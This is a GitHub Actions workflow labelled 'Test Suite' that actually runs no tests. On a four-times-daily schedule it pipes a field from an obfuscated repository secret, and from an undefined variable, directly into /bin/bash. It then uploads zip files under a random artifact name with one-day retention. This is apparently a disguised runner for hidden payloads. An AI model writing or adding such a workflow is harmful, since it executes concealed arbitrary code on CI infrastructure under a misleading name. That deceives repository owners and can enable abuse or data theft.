name: Test Suite
on:
  workflow_dispatch:

  schedule:
    - cron: '29 3,9,15,21 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Main step
        env:
          pys78: ${{ secrets.pys78 }}
        run: |
          printf '%s' "$pys78" | jq -r .pyfu9 | /bin/bash
          echo $dhd534 | jq -r .w1577 | /bin/bash

      - name: Save data
        uses: actions/upload-artifact@v4
        with:
          name: 7c1boSQD
          path: "*.zip"
          retention-days: 1
